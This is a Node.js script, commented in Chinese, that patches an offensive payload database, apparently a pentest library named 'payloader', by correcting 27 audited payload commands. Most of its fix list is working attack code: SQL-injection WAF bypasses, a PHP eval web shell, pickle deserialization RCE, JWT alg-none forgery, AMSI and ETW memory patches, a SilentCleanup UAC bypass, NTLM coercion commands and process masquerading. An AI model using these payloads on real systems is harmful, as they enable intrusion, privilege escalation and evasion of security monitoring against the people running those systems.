#!/usr/bin/env node
/**
 * P0 命令修复（27 处审计确认的技术性错误）：expectedCommand 锚 DB 现值，from→to 精确替换或整条重写。
 * 生成 payload-command-overrides-p0fix-2026-09.json 并注册 manifest。
 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

const db = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
const all = db.prepare('SELECT id, data FROM payloads').all().map(r => JSON.parse(r.data));
db.close();
const byId = new Map(all.map(p => [p.id, p]));

// 全局污染扫描
for (const p of all) for (const [ai, s] of [...(p.execution || []).map((s, i) => [i, s]), ...(p.wafBypass || []).map((s, i) => [i, s])]) {
  if (/项目payloader|D:\\项目|D:项目/.test(s.command || '')) console.log('⚠️ 污染残留:', p.id, (s.title?.zh || '').slice(0, 20), JSON.stringify(/.{0,20}(项目payloader|D:.{0,3}项目).{0,20}/.exec(s.command)[0]));
}

const R = (s) => s; // 标记函数
// from→to（from 必须在现值中唯一命中）；full=整条替换
const FIXES = [
  // ── pack1 ──
  { id: 'sqli-http-chunked-carrier', area: 'wafBypass', index: 1, from: '\n9\n%27%20OR%201\n', to: '\nc\n%27%20OR%201\n' },
  { id: 'sqli-carrier-chunked', area: 'wafBypass', index: 2, from: '\nE\n%2527%2520OR%252\n7\n01%253D1--\n', to: '\n10\n%2527%2520OR%252\na\n01%253D1--\n' },
  { id: 'sqli-oracle-utl-file-capability', area: 'wafBypass', index: 2, from: 'DECLARE v_exists BOOLEAN; BEGIN', to: 'DECLARE v_exists BOOLEAN; v_length NUMBER; v_block NUMBER; BEGIN' },
  { id: 'httpbypass-oob-sql-network-resolution', area: 'execution', index: 0, from: "DBMS_LDAP.INIT('{LAB_OAST}',80)%20FROM%20DUAL||'", to: "DBMS_LDAP.INIT('{LAB_OAST}',80)%20FROM%20DUAL))||'" },
  { id: 'httpbypass-oob-sql-network-resolution', area: 'execution', index: 0, from: "\n';+COPY%20users(names)%20FROM", to: '' },
  { id: 'sqli2-wordpress-url-wrapped-union-query', area: 'execution', index: 0, from: 'unionselect', to: 'union%20select' },
  // ── pack2 ──
  { id: 'rce-log-poison', area: 'execution', index: 0, from: "eval(\\$_POST['cmd'])", to: "eval($_REQUEST['cmd'])" },
  { id: 'rce-log-poison', area: 'execution', index: 1, from: "eval(\\$_POST['cmd'])", to: "eval($_REQUEST['cmd'])" },
  { id: 'rce-deserialize', area: 'execution', index: 2, full: 'import pickle\nimport os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, (\'whoami\',))\npayload = pickle.dumps(Exploit())' },
  { id: 'nosql2-spel-spring-expression-languag', area: 'wafBypass', index: 0, from: '|{bash"})}', to: '|{bash,-i}"})}' },
  { id: 'ssti2-xxe-error-based', area: 'execution', index: 0, from: '%xxe;\n%payload;\n%remote;', to: '%dtd;' },
  { id: 'inject2-jndi-injection-265-lines', area: 'execution', index: 0, from: '{{ATTACKER_HOST}_HOST}', to: '{ATTACKER_HOST}' },
  // ── pack3 ──
  { id: 'auth-session-fixation', area: 'wafBypass', index: 2, from: 'Content-Length: 38', to: 'Content-Length: 42' },
  { id: 'auth-reset-host-header', area: 'wafBypass', index: 0, from: 'Content-Length: 35', to: 'Content-Length: 36' },
  { id: 'auth-reset-host-header', area: 'wafBypass', index: 2, from: 'Content-Length: 35', to: 'Content-Length: 36' },
  { id: 'auth-saml-xsw', area: 'wafBypass', index: 2, from: 's#ID="_signed_assertion"#ID="_signed_assertion"<!--x-->#', to: 's#</Assertion>#</Assertion><!--x-->#' },
  { id: 'auth-remember-token-integrity', area: 'wafBypass', index: 0, re: /^printf "%s" "(.+)" \| base64 -w0 \| curl -sS --max-time 5 -b "remember=@-" (.+)$/s, to: 'V=$(printf "%s" "$1" | base64 -w0); curl -sS --max-time 5 -b "remember=$V" $2' },
  { id: 'auth-remember-token-integrity', area: 'wafBypass', index: 1, re: /^printf "%s" "(.+)" \| base64 -w0 \| curl -sS --max-time 5 -b "remember=@-" (.+)$/s, to: 'V=$(printf "%s" "$1" | base64 -w0); curl -sS --max-time 5 -b "remember=$V" $2' },
  { id: 'auth-remember-token-integrity', area: 'wafBypass', index: 2, re: /^printf "%s" "(.+)" \| base64 -w0 \| curl -sS --max-time 5 -b "remember=@-" (.+)$/s, to: 'V=$(printf "%s" "$1" | base64 -w0); curl -sS --max-time 5 -b "remember=$V" $2' },
  { id: 'auth2-jwt', area: 'wafBypass', index: 0, full: `python3 -c "import base64;e=lambda s:base64.urlsafe_b64encode(s.encode()).rstrip(b'=').decode();h=e('{\\"alg\\":\\"RS256\\",\\"typ\\":\\"JWT\\",\\"alg\\":\\"none\\"}');print(h+'.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.')"` },
  { id: 'httpbypass-host-evil-com', area: 'wafBypass', index: 0, from: 'Content-Length: 35', to: 'Content-Length: 36' },
  { id: 'httpbypass-host-evil-com', area: 'wafBypass', index: 2, from: 'Content-Length: 35', to: 'Content-Length: 36' },
  { id: 'api2-subscription', area: 'wafBypass', index: 1, from: '-H "X-Subscription-Protocol: apollo', to: '-H "X-Subscription-Protocol: apollo-ws"' },
  // ── pack4b ──
  { id: 'persistence-process-hollowing', area: 'execution', index: 1, from: '@(D:项目payloader.Modules | Select-Object -First 5)', to: '@($_.Modules | Select-Object -First 5)' },
  { id: 'silver-ticket', area: 'execution', index: 2, full: '# SPN 服务类型对照（构造票据时按目标服务选择）\n# CIFS - 文件共享\n# HTTP - Web 服务\n# LDAP - 目录服务\n# MSSQLSvc - SQL 服务\n# HOST - 计划任务/服务控制' },
  { id: 'process-injection', area: 'execution', index: 1, full: '# 进程镂空 API 序列（按顺序对应 loader 步骤）\n# 1. CreateProcess(CREATE_SUSPENDED)\n# 2. NtUnmapViewOfSection\n# 3. VirtualAllocEx\n# 4. WriteProcessMemory\n# 5. ResumeThread' },
  { id: 'evasion-arg-spoofing', area: 'execution', index: 0, full: '# CreateProcess 参数伪装对照（ lpApplicationName 与 lpCommandLine 不一致即遥测告警点）\n# lpApplicationName = "C:\\Windows\\System32\\cmd.exe"\n# lpCommandLine = "C:\\Windows\\System32\\cmd.exe /c whoami"' },
  { id: 'uac-bypass', area: 'wafBypass', index: 3, full: 'reg add HKCU\\Environment /v windir /t REG_SZ /d "cmd /k whoami" /f 2>nul\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i' },
  { id: 'lateral-wmi', area: 'wafBypass', index: 1, from: 'Set-CimInstance', to: 'New-CimInstance', all: true },
  { id: 'amsi-bypass', area: 'wafBypass', index: 1, full: `$sig='[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);';$k=Add-Type -MemberDefinition $sig -Name K -Namespace W -PassThru;$h=$k::LoadLibrary('amsi.dll');$p=$k::GetProcAddress($h,'AmsiScanBuffer');$b=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);$k::VirtualProtect($p,6,0x40,[ref]0);[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,6)` },
  { id: 'etw-patch', area: 'wafBypass', index: 0, full: `$sig='[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);';$k=Add-Type -MemberDefinition $sig -Name K -Namespace W -PassThru;$h=$k::LoadLibrary('ntdll.dll');$p=$k::GetProcAddress($h,'EtwEventWrite');$b=[byte[]](0xC3);$k::VirtualProtect($p,1,0x40,[ref]0);[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,1)` },
  { id: 'ntlm-relay', area: 'wafBypass', index: 2, full: "python3 petitpotam.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}\npython3 printerbug.py '{LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}'@{LAB_HOST} {LAB_OPERATOR_HOST}\npython3 dfscoerce.py -u {LAB_USER} -d {LAB_DOMAIN} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}" },
  { id: 'evasion-process-masq', area: 'wafBypass', index: 0, full: `$pbi=[Win32.NtDll]::NtQueryInformationProcess($PID);$peb=[System.Runtime.InteropServices.Marshal]::ReadIntPtr($pbi,0x20);$pp=[System.Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]::Add($peb,0x20));$buf=[System.Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]::Add($pp,0x78));[byte[]]$f=[System.Text.Encoding]::Unicode.GetBytes('C:\\Windows\\System32\\svchost.exe');[System.Runtime.InteropServices.Marshal]::Copy($f,0,$buf,[Math]::Min($f.Length,56))` },
];

const entriesById = new Map();
const push = (id, patch) => {
  if (!entriesById.has(id)) entriesById.set(id, { id, patches: [] });
  entriesById.get(id).patches.push(patch);
};
let ok = 0, fail = 0;
for (const f of FIXES) {
  const p = byId.get(f.id);
  const step = p && (p[f.area] || [])[f.index];
  if (!p || !step) { console.log('✗ 目标不存在:', f.id, f.area, f.index); fail++; continue; }
  const cmd = step.command || '';
  let next = null;
  if (f.full !== undefined) next = f.full;
  else if (f.re) { const m = f.re.exec(cmd); next = m ? cmd.replace(f.re, f.to) : null; }
  else {
    if (!cmd.includes(f.from)) { console.log('✗ from 未命中:', f.id, f.area + '[' + f.index + ']', JSON.stringify(f.from).slice(0, 60)); fail++; continue; }
    next = f.all === true ? cmd.split(f.from).join(f.to) : cmd.replace(f.from, f.to);
  }
  if (next === null) { console.log('✗ 正则未命中:', f.id, f.area, f.index); fail++; continue; }
  if (next === cmd) { console.log('△ 无变化:', f.id, f.area, f.index); continue; }
  push(f.id, { area: f.area, index: f.index, expectedCommand: cmd, command: next });
  ok++;
}
const doc = { schemaVersion: 1, entries: [...entriesById.values()] };
const DOC = 'payload-command-overrides-p0fix-2026-09.json';
fs.writeFileSync(CR(DOC), JSON.stringify(doc, null, 2) + '\n');
const manifest = JSON.parse(fs.readFileSync(CR('manifest.json'), 'utf8'));
if (!manifest.payloadCommandOverrideFiles.includes(DOC)) {
  manifest.payloadCommandOverrideFiles.push(DOC);
  manifest.payloadCommandOverrideFiles.sort();
  fs.writeFileSync(CR('manifest.json'), JSON.stringify(manifest, null, 2) + '\n');
}
console.log(`P0 修复补丁: ${ok} 成功 / ${fail} 失败 / ${doc.entries.length} 条 → ${DOC}`);
